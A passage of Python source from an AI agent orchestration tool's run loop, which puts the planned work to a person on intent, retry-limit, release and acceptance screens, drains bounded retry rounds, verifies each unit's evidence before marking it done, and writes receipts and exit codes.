    parts_for_screen, _parts_why = loop_bridge.load_parts(_source_tools_dir())
    spawn = (parts_for_screen or {}).get("spawn")
    limit_seconds, limit_note = _worker_time_limit(spawn)
    bounds_line = ("Bounds, before any work starts: each piece of work gets "
                   "at most %d attempt(s), and one attempt's worker is "
                   "stopped after %d seconds%s."
                   % (MAX_UNIT_ATTEMPTS, limit_seconds,
                      (" (%s)" % limit_note) if limit_note else ""))
    # check-authorship-v1, Option A: "Refuse: nothing is claimed", the
    # second option this screen now carries beside "Proceed". It names no
    # `scores`, so decide.score() leaves it unmarked on every criterion and
    # its total is 0.0; _auto_resolver's own "top-ranked option" rule can
    # therefore never pick it, which is exactly how an unattended run stays
    # unattended. Only a live human at the intent screen (--interactive or
    # BROTHER_INTERACTIVE=1) can ever choose it.
    refuse_option = {
        "id": "refuse", "name": "Refuse: nothing is claimed",
        "one_liner": "stop here, before any unit is claimed or run",
        "cost": "none: nothing has started",
        "reversible": "moot: nothing happened",
        "pros": ["nothing is claimed, run, or written until you say so"],
        "cons": ["the outcome goes unattempted"],
    }
    # P3 (persona integration): door.py's own tree-signal matcher already
    # stamped lens_inferred on the Work document at creation time (or left
    # it None, when nothing matched); this screen only reads it back and
    # prints it, the one-visible-Brother rule (no new command, no new
    # mode). extra_options carries a second correction option ONLY when a
    # lens was actually inferred, so a plain repository's intent screen is
    # unchanged. It names no `scores`, exactly like refuse_option above, so
    # an unattended run never picks it either.
    lens_inferred = record.get("lens_inferred")
    lens_name = (lens_inferred or {}).get("lens")
    # COMPOSITIONAL (persona doc 5.2): door.py stamps EVERY inferred lens
    # in `lenses`, most specific first; this line names all of them with
    # their own matched paths, each capped as before. A Work document
    # written before composition landed carries no `lenses` key, so the
    # single {lens, matched_paths} dict is passed instead and the line
    # reads exactly as it did then.
    lens_line = door.lenses_assumption_line(
        (lens_inferred or {}).get("lenses")
        or ([lens_inferred] if lens_inferred else []))
    # P5 (persona integration): door.py's own metric search already decided
    # whether the tree answers the pack's challenge_question; this screen
    # only reads the result back. An assumption is stated here, in the
    # same summary block as the lens line; a PENDING question (nothing
    # found) is read further below, once the choice is known, since asking
    # it is only ever right after "proceed" is actually chosen.
    challenge_line = door.challenge_assumption_line(
        record.get("challenge_assumption"))
    # P4: the intent screen's own risk, rollback and evidence-plan lines,
    # doc 4.1 stage 4's other blocks beside the unit list this screen
    # already printed. risk_triggers is receipt_door's, reused outright
    # (never redefined here) and run once, on precheck_rows, before any unit
    # is claimed; each unit_lines entry already carries its evidence family
    # (P1). `before`, above, is this target's own HEAD read before the dirty
    # check and before any claim, so it is exactly the revision a rollback
    # returns to, not a second git call.
    assumption_lines = ([lens_line] if lens_line else []) + \
        ([challenge_line] if challenge_line else []) + \
        _human_decision_lines(record)
    # The lenses this run inferred are passed with the rows: a persona
    # pack's forcing classes are armed for a repository that pack was
    # inferred for and for no other, so "add a retry to the fetch helper"
    # no longer reads the backend pack's "retry" class on a tree that is
    # not a service (receipt_door._lens_forcing_triggers).
    risk_line = _risk_line(receipt_door.risk_triggers(
        precheck_rows, receipt_door.record_lenses(record)))
    rollback_line = "Rollback: %s" % (before or NODATA)
    lens_options = []
    if lens_name:
        lens_options.append({
            "id": "otherwise", "name": "Say otherwise: not %s work" % lens_name,
            "one_liner": "clear the assumed lens on the Work document",
            "cost": "none: only the lens_inferred field changes",
            "reversible": "moot: nothing about the plan itself changes",
            "pros": ["a wrong assumption is not silently carried into any "
                    "profession-aware step downstream"],
            "cons": ["none named"],
        })
    summary_blocks = []
    if assumption_lines:
        summary_blocks.append("\n".join(assumption_lines))
    if risk_line:
        summary_blocks.append(risk_line)
    summary_blocks.append(
        "This is what this run is about to act on before anything is "
        "claimed or run, one line per piece of work, exactly as the "
        "planning model wrote it:\n\n" + "\n".join(unit_lines))
    summary_blocks.append(bounds_line)
    # E90, THE PRICE, SAID BEFORE THE WAIT rather than after it. The founder
    # ruled option B on docs/decisions/light-path-for-small-changes-
    # 2026-09-04.json: the door keeps its shape and says what it charges on
    # the screen a person reads before anything is claimed. The durations
    # are read ONCE here and handed to the governor line further down as
    # well, so the two sentences can never disagree about what earlier runs
    # took, and so this costs one directory walk rather than two.
    price_durations = previous_run_durations(runs_root, cwd)
    price_block = build_price_block(1 + total_units, price_durations)
    summary_blocks.append(price_paragraph(price_block))
    summary_blocks.append(rollback_line)
    intent_choice = _human_moment(log, "intent", _fact_spec(
        title="Proceed with this outcome", eyebrow="Intent",
        plain_summary="\n\n".join(summary_blocks),
        question="Is this the outcome you meant, and are these the checks "
                 "that should decide it?",
        option_id="proceed", option_name="Proceed as decomposed",
        one_liner="%r, %d piece(s) of work" % (record.get("outcome"),
                                                total_units),
        marks={
            "matches_the_settled_outcome": (
                0.5, 10.0,
                "the outcome named here is copied verbatim from what this "
                "run resolved to act on"),
            "already_progressed": (
                0.5, round(10.0 * already / total_units, 2) if total_units
                else 10.0,
                "%d of %d piece(s) already carry a verified DONE status on "
                "this run's own Work document" % (already, total_units)),
        }, extra_options=[refuse_option] + lens_options), resolver=live_resolver)
    if intent_choice.get("choice") == "refuse":
        print("brother_run: refused at the intent screen; nothing was "
              "claimed or run", file=sys.stderr)
        return 1
    if intent_choice.get("choice") == "otherwise":
        # THE REWRITE (P3): the person just said this is not the assumed
        # lens, so the field is corrected on the Work document, same
        # load/mutate/write shape _stamp_prechecks already uses; the run
        # proceeds normally, with no lens assumed. P5 rides along: any
        # challenge machinery derived from this same lens is stale too
        # (_clear_lens_inferred now clears it on disk as well), so the
        # in-memory copy is corrected here in the same breath, before the
        # question-asking block below ever reads pending_challenge.
        _clear_lens_inferred(record["path"])
        record["lens_inferred"] = None
        record["challenge_assumption"] = None
        record["pending_challenge"] = None
        log.say("brother_run: the assumed lens (%s) was corrected at the "
                "intent screen; lens_inferred cleared on the Work document"
                % lens_name)
    # P5 (persona integration, gap P5): the ONE profession-aware question
    # this run may ask, only once "proceed" was actually chosen (a refused
    # run asks nothing) and only when door.py left a question pending (the
    # tree could not answer it itself). _ask_pending_challenge enforces the
    # whole budget by itself: it reads nothing at all unless `interactive`
    # is True, so an unattended run asks zero questions, exactly as the
    # doc's own floor requires, and the missing metric is left to read
    # NO-DATA on the receipt (build_report, below) instead.
    pending_challenge = record.get("pending_challenge")
    if intent_choice.get("choice") == "proceed" and pending_challenge:
        # COMPOSED (persona doc 5.2): compute_challenge may have composed a
        # second pack's question onto the primary one, already cut to the
        # summed question budget. They are asked in composed order, most
        # specific lens first, each still exactly one line read by
        # _ask_pending_challenge, which by itself keeps an unattended run
        # at zero questions. An unanswered question stops the composition:
        # a closed stream will not answer the next one either.
        composed = pending_challenge.get("questions") or [pending_challenge]
        answered = []
        for pending in composed:
            answer = _ask_pending_challenge(pending, interactive)
            if not answer:
                break
            answered.append((pending, answer))
        if answered:
            pending_challenge, challenge_answer = answered[0]
            _write_human_decision(record["path"], pending_challenge,
                                  challenge_answer, also=answered[1:])
            record["human_decision"] = {
                "lens": pending_challenge.get("lens"),
                "question": pending_challenge.get("question"),
                "answer": challenge_answer}
            if answered[1:]:
                record["human_decision"]["also"] = [
                    {"lens": p.get("lens"), "question": p.get("question"),
                     "answer": a} for p, a in answered[1:]]
            record["pending_challenge"] = None
            for pending, answer in answered:
                log.say("brother_run: profession-aware question answered "
                        "(%s): %s -> %s" % (pending.get("lens") or NODATA,
                                            pending.get("question"), answer))
        else:
            log.say("brother_run: profession-aware question not answered "
                    "(%s); the missing metric reads NO-DATA on the receipt"
                    % ("zero questions in unattended mode" if not interactive
                       else "the input stream closed before an answer "
                            "arrived"))
    # THE DECLARATION IN THE RESOLUTION LINE TOO (E40): what each unit says
    # it builds on, by field name, beside the choice that let the run
    # proceed, so a grep of the log for depends_on finds it.
    log.say("brother_run: intent resolution, depends_on per unit: %s"
            % "; ".join("%s: %s" % (r.get("id"), _depends_on_text(r))
                        for r in precheck_rows))
    # THE LOOM'S GATE, and only when the caller asked for it. Parking holds a
    # risky piece BEFORE it is claimed, so the release screen at the end of
    # this run is a decision that can still go either way rather than a
    # report of something already merged.
    #
    # OFF BY DEFAULT, deliberately and narrowly: the founder's own decision
    # (docs/decisions/door-redesign-2026-08-31.json) ships the receipt door
    # now and commits the loom for after the filing, and the study named
    # parking's own risk as touching termination logic with three measured
    # incidents behind it. The alternative, parking on by default, is one
    # word here and belongs to whoever decides the contract after the filing.
    if args.park_risky:
        _parked, park_sentences = loom.park_units(record["path"])
        # The document on disk is now the truth about which rows are held, so
        # the in-memory copy is re-read rather than patched: build_report and
        # the receipts below read `record`, and a stale copy would report a
        # parked unit as merely unstarted.
        doc_path = record["path"]
        with open(doc_path, "r", encoding="utf-8") as fh:
            record = json.load(fh)
        record["path"] = doc_path
        for sentence in park_sentences:
            log.say("brother_run: " + sentence)
    # THE FIX: a unit whose check_looks_broken _stamp_prechecks already
    # measured is pulled out of the plan on disk right here, before the
    # drain below claims anything, so it is never claimed and no worker is
    # ever dispatched against a check that cannot prove any work.
    # _restore_refused_precheck_units, after the drain, folds it back into
    # the document so the report and every receipt still account for it.
    precheck_unit_order = [u.get("id") for u in
                           (record.get("rows") or record.get("units") or [])]
    refused_broken = _refuse_broken_precheck_units(record["path"])
    # A unit whose claim already spent MAX_UNIT_ATTEMPTS in the run(s) this
    # one resumed is pulled the same way (see _refuse_exhausted_units); a
    # fresh run has no claim store yet and this adds nothing.
    refused_broken.update(_refuse_exhausted_units(record["path"], claims_path))
    for uid, (_row, reason) in refused_broken.items():
        log.say("brother_run: refusing %s before any worker starts: %s"
                % (uid, reason))
    # EVERY REMAINING UNIT REFUSED BEFORE WORK (the toy's run 4, 2026-09-03:
    # two rounds that claimed nothing, then a report with an empty verified
    # section): say so once and never open the drain, which would only
    # reconcile a claim store and print two empty rounds over a plan with
    # nothing left in it. `claimable` is what a scheduler could still hand
    # out; a resumed run whose remaining units are all refused counts too,
    # since its finished ones need no round either.
    claimable = [u.get("id")
                 for u in (record.get("rows") or record.get("units") or [])
                 if u.get("status") != "DONE" and u.get("id") not in refused_broken]
    skip_drain = bool(refused_broken) and not claimable
    if skip_drain:
        log.say("brother_run: nothing was claimed or run: all %d remaining "
                "piece(s) were refused before any worker started"
                % len(refused_broken))
    else:
        # THE GOVERNOR LINE, once before the work starts. A person waiting
        # on a silent process cannot tell a long run from a hung one, and
        # this estate will not invent a duration to comfort them: how long
        # each piece takes depends on the model and the checks, and nobody
        # here has measured it. Saying that once is honest; saying "about 5
        # minutes" would not be. The BOUND is a different thing from an
        # estimate and is stated: the attempt cap and the per-attempt limit
        # the intent screen already carries.
        # E46: the honest sentence stays exactly as it was (this estate will
        # not invent a duration), and the MEASURED durations of earlier runs
        # against this same target are added beside it when there are any.
        # Real figures from finished runs are not an estimate of this one and
        # the wording says so; --quiet drops them with the heartbeat.
        earlier = ("" if heartbeat_seconds <= 0 else
                   previous_runs_line(price_durations))
        log.say("brother_run: %d piece(s) of work, none finished yet. How "
                "long this takes is not knowable in advance, so no estimate "
                "is given; each piece reports as it lands. Each piece gets "
                "at most %d attempt(s), and one attempt's worker is stopped "
                "after %d seconds.%s" % (total_units, MAX_UNIT_ATTEMPTS,
                                         limit_seconds,
                                         (" " + earlier) if earlier else ""))

    # The graph DRAINS across batches: one loop_bridge run claims only the
    # units dispatchable at its start, so a unit whose dependency integrates
    # in batch one only becomes claimable in batch two. Found live on the
    # first real run (u1 integrated, u2 and u3 never claimed, exit 1). Each
    # round must make progress: either the integrated set grows, or a unit
    # still within its attempt bound was given another bounded claim (its
    # claim store attempt count grew). A round that does neither ends the
    # drain, so a stuck graph terminates instead of spinning.
    #
    # THE GAP THIS CLOSES (forced-repair-proof, 2026-08-30): integrate.py
    # classifies a unit whose own check fails on the current canonical base
    # as NEEDS-REPAIR-ON-NEW-BASE and leaves it SCHEDULED, eligible for a
    # fresh claim next round. Measuring progress by integration alone read a
    # round that only produced that classification as a no-op and stopped
    # the drain right there, so the repair the classification implies was
    # never actually dispatched: a unit that would have gone green on a
    # second claim was never given one.
    loop_texts = []
    done_before = set()
    attempts_before = {}
    # THE WAIT ITSELF: the round loop below is a poll, dispatching a batch
    # and checking what came back, up to 25 times. One line marks it
    # starting, one marks it ending; the rounds in between print their own
    # progress (below) but never repeat this line.
    unit_ids = [u.get("id") for u in
               (record.get("rows") or record.get("units") or [])]
    wait_start = None if skip_drain else _governor_wait_line(
        log, ", ".join(unit_ids) if unit_ids else "nothing")
    # E46, THE WAIT ITSELF, NARRATED. Started here rather than inside
    # run_loop because the silence a person complained about spans the WHOLE
    # drain (up to 25 rounds), and a heartbeat scoped to one round would go
    # quiet in every gap between them. loop_bridge.run_node reaches it
    # through run_heartbeat.current(), so nothing in between has to carry it.
    # Started and stopped in a plain pair around the loop, exactly like
    # wait_start and _governor_wait_close below it: the thread is a daemon,
    # so an unhandled exception here ends the process and takes it with it,
    # and wrapping 150 lines in a try purely to stop a daemon thread would
    # reindent the whole drain for nothing.
    beat = run_heartbeat.Heartbeat(interval=heartbeat_seconds,
                                   bound_seconds=limit_seconds).start()
    for round_no in range(1, 1 if skip_drain else 26):
        # T2: the two revisions THIS ROUND ran between, for the attempt
        # trace's tree-state summary below; _head is cheap (git rev-parse)
        # and this run already pays for it once per whole run, so paying it
        # twice per round as well costs nothing a maintainer would notice.
        round_head_before = _head(cwd)
        loop_code, loop_text = run_loop(record["path"], claims_path, cwd,
                                        args.slots)
        round_head_after = _head(cwd)
        loop_texts.append(loop_text)
        # VERBATIM TO THE LOG, NOT AT THE PERSON. loop_bridge's own output is
        # the engine talking to its maintainer (claimed lanes, isolation
        # mode, scope audits); an engineer debugging a run needs every word of
        # it and a person who asked for an outcome needs none of them.
        log.note(loop_text.rstrip())
        log.note("brother_run: loop_bridge round %d exited %s"
                 % (round_no, loop_code))
        claims = _read_claims(claims_path)
        done_now = {uid for uid, c in (claims or {}).items()
                    if str(c.get("state", "")) in ("done", "integrated")}
        attempts_now = {uid: int(c.get("attempt") or 0)
                        for uid, c in (claims or {}).items()}
        # T2: EVERY ATTEMPT LEAVES ITS OWN TRACE, beside any earlier one for
        # the same unit, never over it. claims.json holds only the LATEST
        # attempt per unit (claim_store.release documents this: "never
        # deletes the record" but acquire() on a reclaim overwrites it in
        # place), so a failed attempt's evidence, including its check's real
        # output, is gone the moment the unit is reclaimed next round unless
        # it is copied out here, now, while this round's claims are still on
        # disk. _write_attempt_trace is keyed by attempt number and never
        # overwrites a directory that already exists, so this call is safe
        # to make for every unit every round.
        tree_state = _round_tree_state(cwd, round_head_before, round_head_after)
        for uid, claim in (claims or {}).items():
            attempt = claim.get("attempt") if isinstance(claim, dict) else None
            if isinstance(attempt, int) and attempt > 0:
                _write_attempt_trace(run_dir, uid, attempt, claim, loop_text,
                                     tree_state)
        # FEED INTEGRATION BACK INTO THE PLAN. The scheduler computes the
        # ready set from the Work document, and nothing else updates it, so
        # without this write-back a finished unit is re-offered forever and
        # its dependents never become claimable (measured live: round two
        # re-claimed the done unit as attempt 2 and starved its two
        # dependents). DONE plus real, independently-checked evidence is the
        # board's own contract: a claim whose evidence does not check out is
        # REFUSED here rather than stamped, so `verified_now` (not `done_now`,
        # which is only the claim store's own unverified say-so) is what
        # actually drives the rest of this round.
        #
        # ZERO-CHANGE UNITS (the toy-repo finding, then E41, 2026-09-03):
        # _mark_integrated stamps each row it marks DONE with the file list
        # ITS OWN merge changed, read from the claim's evidence (integrate_one
        # measured it at the merge), never this round's diff, which stamped a
        # sibling's files on a unit that changed nothing; receipt_door's
        # receipts_for() refuses to call a unit delivered when that stamp is
        # empty, whatever its check says.
        _changed, refusals = _mark_integrated(record["path"], done_now, claims,
                                              cwd)
        for uid, reason in refusals.items():
            # The reason itself is not lost: it reaches the person as that
            # unit's own receipt at the end, in the report's plain sentence.
            log.note("brother_run: REFUSED to mark %s integrated: %s"
                     % (uid, reason))
        verified_now = done_now - set(refusals)
        remaining = [u.get("id")
                     for u in (record.get("rows") or record.get("units") or [])
                     if u.get("id") not in verified_now]
        # THE GOVERNOR LINE AT EVERY ROUND BOUNDARY. Counts, never a forecast.
        log.say("brother_run: round %d done, %d of %d piece(s) finished, %d "
                "to go" % (round_no, total_units - len(remaining), total_units,
                           len(remaining)))
        if not remaining:
            break
        # REPAIR-ELIGIBLE: a remaining unit whose claim attempt count has not
        # yet reached the bound, so giving it another claim next round is a
        # legitimate bounded repair, not a spin. This is what makes counting
        # attempt growth as progress still terminate: each unit can only
        # supply it MAX_UNIT_ATTEMPTS times.
        repairable = [uid for uid in remaining
                     if attempts_now.get(uid, 0) < MAX_UNIT_ATTEMPTS]
        # A round makes repair progress only when a unit whose attempt count
        # ACTUALLY GREW this round is still under its bound. The old test
        # ("attempts changed anywhere AND some unit is under the bound") let a
        # never-claimed unit BLOCKED behind a failure (attempt 0, forever
        # counted "repairable") keep the drain alive while a failing unit's
        # attempts climbed, so the loop spun to its 25-round ceiling: the harsh
        # EVAD 2026-08-31 measured 20 rounds on a graph that could never
        # converge.
        grew = [uid for uid in remaining
                if attempts_now.get(uid, 0) > attempts_before.get(uid, 0)]
        repair_progress = any(attempts_now.get(uid, 0) < MAX_UNIT_ATTEMPTS
                             for uid in grew)
        progressed = (verified_now != done_before) or repair_progress
        held_now = [uid for uid in remaining if uid in loom.parked_ids(record)]
        if not progressed:
            if held_now:
                log.say("brother_run: %d piece(s) are parked and waiting for "
                        "your decision, so this run stops here rather than "
                        "running them: %s"
                        % (len(held_now), ", ".join(held_now)))
            elif remaining and not repairable:
                log.say("brother_run: %d piece(s) were retried %d times each "
                        "and never finished (%s); the retry budget is "
                        "exhausted, so this run stops trying them"
                        % (len(remaining), MAX_UNIT_ATTEMPTS,
                           ", ".join(remaining)))
                # I3, THE SECOND HUMAN MOMENT: a forcing condition. Every
                # stuck piece has spent its bounded outer retries; guessing
                # again is the danger a forcing condition names
                # (products/brothermode/tools/bm_escalate.py's own words),
                # so the drain does not guess a fourth time, it stops and
                # poses this. The mark is the real, measured share of the
                # retry budget the stuck piece(s) actually spent, not a
                # typed number.
                avg_attempts = (sum(attempts_now.get(uid, 0)
                                    for uid in remaining) / len(remaining))
                _human_moment(log, "forcing-condition", _fact_spec(
                    title="Stop retrying, or keep guessing",
                    eyebrow="Forcing condition",
                    plain_summary="%d piece(s) of this run (%s) never "
                                  "passed their own check after %d "
                                  "attempts each." % (len(remaining),
                                  ", ".join(remaining), MAX_UNIT_ATTEMPTS),
                    question="Guessing again is the risk this stops for: "
                             "does this run stop here?",
                    option_id="stop-here",
                    option_name="Stop, as the engine already does",
                    one_liner="the bounded repair budget is spent; this "
                              "run stops trying %s rather than guess a "
                              "fourth time" % ", ".join(remaining),
                    marks={"retry_budget_spent": (
                        1.0, round(10.0 * avg_attempts / MAX_UNIT_ATTEMPTS, 2),
                        "the stuck piece(s) used %.1f of %d allowed outer "
                        "attempts on average, measured from this run's own "
                        "claim store" % (avg_attempts, MAX_UNIT_ATTEMPTS))}),
                    resolver=live_resolver)
            else:
                log.say("brother_run: the last round moved nothing forward, "
                        "so this run stops rather than repeating itself; %d "
                        "piece(s) are unfinished" % len(remaining))
            break
        done_before, attempts_before = verified_now, attempts_now
    beat.stop()
    if wait_start is not None:
        _governor_wait_close(log, wait_start)
    after = _head(cwd)

    # THE DOCUMENT ON DISK IS THE VERIFIER'S TRUTH. _mark_integrated wrote
    # DONE or integration_refused row by row during the drain; the in-memory
    # copy predates every one of those writes, so the report below must read
    # the document, not the copy, or a verifier's refusal never reaches the
    # report or the exit code (EVAD run 5 trial 2's exact finding).
    doc_path = record["path"]
    # THE FIX, restore half: every unit _refuse_broken_precheck_units pulled
    # out of the plan before the drain goes back in now, at its original
    # position, so the reload just below (and the report built from it)
    # accounts for it same as any other unit.
    _restore_refused_precheck_units(doc_path, refused_broken, precheck_unit_order)
    # THE MUTATION AT RECEIPT (EVAD run 4 trial 2, 2026-09-03): every DONE
    # unit that declared a dependency has its check re-run with that
    # dependency's own change reverted, and the exit code is stamped onto
    # the document on disk before the reload below, so the report, the
    # screens and the exit code all read one fact. See
    # _stamp_dependency_mutations for the design and the two rejected
    # alternatives.
    _stamp_dependency_mutations(doc_path, _read_claims(claims_path), cwd, log)
    # S32: and then the review pass, on the same document, immediately after
    # its sibling and before the reload below, so what an independent
    # reviewer found rides on the same receipt as everything else. It
    # changes no exit code: see _stamp_review_findings.
    _stamp_review_findings(doc_path, _read_claims(claims_path), cwd, log)
    with open(doc_path, "r", encoding="utf-8") as fh:
        record = json.load(fh)
    record["path"] = doc_path
    # harness-revision-v1 (defect 2, the zero-context critic, 2026-09-03):
    # the reload above carries the ON-DISK stamps, `harness_revision` (the
    # creator, written at run start) and `harness_revision_resumed` (the
    # resumer, written at resume), so every receipt_door.receipts_for() row
    # below names the engine that created the record and build_report adds
    # the one that resumed it; nothing is overwritten in memory here, and a
    # record with no creator stamp reads NO-DATA rather than borrowing this
    # engine's sha. The cost block's own `harness_revision` stays this
    # engine, the one producing the report.

    claims = _merge_usage_sidecar(_read_claims(claims_path), claims_path)
    changed = _changed_files(before, after, cwd)
    log_path = log.path or NODATA
    # THE OUTPUT THE RECEIPTS POINT AT, written where they say it is. Each
    # receipt below tells a person the full output of its check lives in the
    # run log, and a sentence like that is only worth anything if the output
    # is really there: the claim store already keeps it, and this is what
    # makes it readable without opening a json file.
    for uid, claim in sorted((claims or {}).items()):
        ev = claim.get("evidence")
        if not isinstance(ev, dict):
            continue
        body = ev.get("output")
        log.note("---- %s: %s exited %s%s ----\n%s"
                 % (uid, ev.get("check_command"), ev.get("exit_code"),
                    " (output truncated to the last 50 lines by the worker)"
                    if ev.get("output_truncated") else "",
                    body if body else "(the check printed nothing)"))
    loop_text_all = "\n".join(loop_texts)
    # A first pass to get `refused` (failure_category reads it), then the
    # real pass with the cost block attached. build_report is pure and cheap
    # (no I/O beyond what changed/claims already read), so running it twice
    # costs nothing a second call to a formatter would not.
    _report, _integrated, refused = build_report(record, claims, before,
                                                  after, changed,
                                                  log_path=log_path,
                                                  loop_text=loop_text_all,
                                                  cwd=cwd,
                                                  price_block=price_block)
    cost_block = build_cost_block(
        claims, refused, loop_text_all,
        (datetime.datetime.now() - run_start).total_seconds(),
        _harness_version(), harness_revision,
        usage_gap=_usage_gap_reason(spawn))
    report, integrated, refused = build_report(record, claims, before,
                                               after, changed,
                                               log_path=log_path,
                                               loop_text=loop_text_all,
                                               cost_block=cost_block,
                                               cwd=cwd,
                                               price_block=price_block)

    # THE TWO SCREENS, computed from the receipts above and nothing else,
    # and ONLY when this run actually integrated something. A run that
    # delivered nothing has nothing for a person to accept. Acceptance for
    # every completed run (charter line 27: only a human accepts that the
    # delivered result is the one that was wanted), and release as well
    # when this run's own units named one of the six risk classes (charter
    # line 26: only a human decides to ship). Both are rendered by
    # decide.py from a spec whose every mark came out of
    # receipt_door.MARK_TABLE, so no model-authored score can enter here.
    triggers, release_answer = [], None
    if integrated:
        receipts = receipt_door.receipts_for(record, claims, refused, log_path)
        screens, triggers = receipt_door.render_run_screens(
            record, receipts, run_dir, before, after, log_path)
        # screens[0] is always the acceptance result (render_run_screens
        # always builds acceptance_spec); screens[1], when present, is the
        # release result, only built when triggers fired.
        acceptance_result = screens[0] if screens else NODATA
        release_result = screens[1] if len(screens) > 1 else None
        report += "\n  your acceptance screen: %s" % acceptance_result
        report += ("\n  release screen: %s" % release_result
                   if release_result else
                   "\n  no release screen: a plain change")
        # E72.3: THE RECEIPT, at the end of the run and behind no new
        # command or flag. Built from the same in-memory record and the
        # same receipts the two screens above were built from, so the page
        # a person opens, the record a machine reads and the block printed
        # here cannot tell three different stories about one run. A receipt
        # that fails to render returns its own problem string from
        # write_screen and is printed as that string; it never fails the
        # delivery it describes.
        _receipt_path, _receipt_view, receipt_block = (
            receipt_door.render_receipt_screen(record, receipts, run_dir,
                                               before, after, log_path))
        report += "\n" + receipt_block
        release_answer = loom.read_answer(run_dir, "release")
        # I3, THE THIRD AND FOURTH HUMAN MOMENTS: release and acceptance.
        # receipt_door's own acceptance_spec/release_spec (the exact specs
        # already written to screens/ above) are rebuilt here, cheaply
        # (pure functions, no I/O) and posed through the shared seam, so
        # all four moments carry the identical log-then-echo-then-proof
        # shape; the HTML file on disk is still written exactly once, by
        # render_run_screens above, never a second time by this call.
        # loom.py's own rule stays exactly as strict as it already was: the
        # resolver here only ever reports a human's own recorded answer
        # (_recorded_answer_resolver, above), never the auto-pick default
        # _auto_resolver uses for intent and forcing-condition, because a
        # risky change or an unaccepted delivery is never auto-approved.
        # Posed in MOMENTS' own order (release, then acceptance): the release
        # decision is about the risky change, the acceptance about the
        # delivery that closes the chain, so the proxy run of 2026-09-04
        # (docs/plan/runs/i3-loom-2026-09-04) that found them the other way
        # round read the charter's order back rather than its own.
        if triggers:
            _human_moment(log, "release",
                         receipt_door.release_spec(record, receipts, triggers,
                                                   before, after, log_path),
                         resolver=_recorded_answer_resolver(run_dir, "release"))
        _human_moment(log, "acceptance",
                     receipt_door.acceptance_spec(record, receipts, before,
                                                  after, log_path),
                     resolver=_recorded_answer_resolver(run_dir, "acceptance"))

    print(report)
    log.note(report)

    if triggers and not release_answer:
        print("brother_run: this run touched %s, so it needs a person to "
              "decide whether to release it."
              % ", ".join(sorted({t[0] for t in triggers})))
    elif triggers:
        print("brother_run: this run touched %s, and you answered the "
              "release screen %r on %s."
              % (", ".join(sorted({t[0] for t in triggers})),
                 release_answer.get("choice"), release_answer.get("at")))
    # WHAT IS STILL WAITING ON A PERSON, and the one command that answers
    # it. A screen nobody can answer is a report, and the whole point of
    # parking is that this run stopped short of the risky thing on purpose.
    waiting = loom.parked_ids(record)
    if waiting:
        print("brother_run: %d piece(s) were parked before they ran and are "
              "waiting for your decision: %s. Answer the release screen "
              "with:\n  %s %s answer --run %s --screen release --accept "
              "--by \"<your name>\" --at <iso datetime>\nand then ask for "
              "the same outcome again to finish them; --hold instead of "
              "--accept records the opposite and runs nothing."
              % (len(waiting), ", ".join(waiting), sys.executable,
                 os.path.join(HERE, "loom.py"), run_dir))
    print("brother_run: everything the engine did, verbatim, is in %s"
          % log_path)

    # A PARKED PIECE COUNTS AS REFUSED HERE, deliberately: the outcome the
    # caller asked for is not delivered while a piece of it waits on a
    # person, and a zero would say it was. This is the narrowest reading; a
    # distinct exit code for "waiting on a human" is the alternative and it
    # belongs to whoever owns the exit contract, not to this change.
    # SUCCESS MEANS INTEGRATED, not merely dispatched: loop_bridge's own exit
    # code answers "did every dispatched unit verify", which is a different
    # question. A unit that verified in its lane but failed to integrate is
    # still a failure of the outcome the caller asked for.
    #
    # exit-code-convention-v1 (rule 3, the zero-context critic, 2026-09-03):
    # the old `1 if refused else 0` let a run whose every receipt was
    # NO-DATA exit 0, reading as success to a CI consumer that only checks
    # the exit code. Read from the same receipts the report already printed
    # (recomputed here, cheap and pure, the same way build_cost_block's own
    # second build_report call already does): 0 only when this run proved
    # something and refused nothing, 1 when anything refused, 2 when
    # nothing refused but nothing proved either.
    final_receipts = receipt_door.receipts_for(record, claims, refused,
                                               log_path)
    exit_code, exit_reason = _exit_code_for(final_receipts, refused)
    # E73.2, THE LAST CHECKPOINT: run finished. run_dir is settled and the
    # document on disk already carries every DONE and refusal this run is
    # ever going to record, so the capsule written here is the one a
    # --continue against an ALREADY-finished run would read (harmless: a
    # run with nothing left pending reports "done" as its next action).
    # It is written BEFORE the receipt because the receipt reads it (Q8).
    _write_capsule(run_dir)

    # E81, THE RECEIPT, and the last thing this process says. A run that
    # reached here touched the target: the exit code alone proves nothing a
    # stranger can open, and stdout scrolls away. A receipt that cannot be
    # written is a failure of the delivery, not a footnote to it, so it
    # takes the exit code away from zero and says why on the same line.
    receipt_path, receipt_problem = _write_receipt(run_dir, final_receipts,
                                                   report, log_path)
    if receipt_problem:
        exit_code = exit_code or 1
        exit_reason = ("this run left no receipt, so nothing it did is "
                       "provable from disk: %s (the delivery itself ended: "
                       "%s)" % (receipt_problem, exit_reason))
    print("brother_run: exit %d: %s" % (exit_code, exit_reason))
    # E81, THE NEXT COMMAND AFTER A REFUSAL. Printed only when it will
    # actually work: the candidate list is read back off disk through the
    # SAME discovery --continue itself uses, and this run has to be in it,
    # so a line is never offered for a run that is finished or that
    # --continue could not find. The index is carried when the repository
    # holds more than one unfinished run, because a bare --continue lists
    # them instead of picking one.
    if exit_code != 0:
        matches = find_unfinished_runs(runs_root, cwd)
        index = next((i for i, (d, _o, _r) in enumerate(matches, 1)
                      if os.path.abspath(d) == os.path.abspath(run_dir)), None)
        if index is not None:
            lead = ["--continue"] + ([] if len(matches) == 1 else [str(index)])
            print("brother_run: this run is not finished. Continue it with:"
                  "\n  %s" % _next_command(cwd, runs_root, lead))
    if receipt_path:
        print("brother_run: receipt: %s" % receipt_path)
    else:
        print("brother_run: no receipt: %s" % receipt_problem)
    return exit_code


if __name__ == "__main__":
    sys.exit(main())
